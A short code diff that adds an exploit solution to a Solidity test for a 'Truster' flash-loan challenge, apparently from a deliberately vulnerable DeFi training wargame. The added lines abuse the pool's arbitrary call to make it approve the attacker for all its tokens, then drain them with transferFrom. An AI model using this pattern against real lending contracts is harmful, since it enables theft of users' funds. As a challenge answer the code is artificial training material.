@@ -41,7 +41,14 @@ contract Truster is Test {
         /**
          * EXPLOIT START *
          */
+        trusterLenderPool.flashLoan(
+            0,
+            attacker,
+            address(dvt),
+            abi.encodeWithSignature("approve(address,uint256)", address(this), TOKENS_IN_POOL)
+        );
 
+        dvt.transferFrom(address(trusterLenderPool), attacker, TOKENS_IN_POOL);
         /**
          * EXPLOIT END *
          */
